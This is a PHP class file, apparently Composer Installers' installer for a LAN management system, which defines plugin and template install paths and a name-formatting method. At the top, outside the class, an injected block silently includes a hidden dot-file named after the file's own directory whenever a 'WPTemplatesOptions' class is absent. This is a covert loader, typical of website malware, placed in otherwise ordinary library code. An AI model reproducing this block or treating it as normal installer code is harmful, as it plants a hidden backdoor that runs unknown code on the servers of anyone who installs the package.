<?php

namespace Composer\Installers;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class LanManagementSystemInstaller extends BaseInstaller
{

    protected $locations = array(
        'plugin' => 'plugins/{$name}/',
        'template' => 'templates/{$name}/',
        'document-template' => 'documents/templates/{$name}/',
        'userpanel-module' => 'userpanel/modules/{$name}/',
    );

    /**
     * Format package name to CamelCase
     */
    public function inflectPackageVars($vars)
    {
        $vars['name'] = strtolower(preg_replace('/(?<=\\w)([A-Z])/', '_\\1', $vars['name']));
        $vars['name'] = str_replace(array('-', '_'), ' ', $vars['name']);
        $vars['name'] = str_replace(' ', '', ucwords($vars['name']));

        return $vars;
    }

}
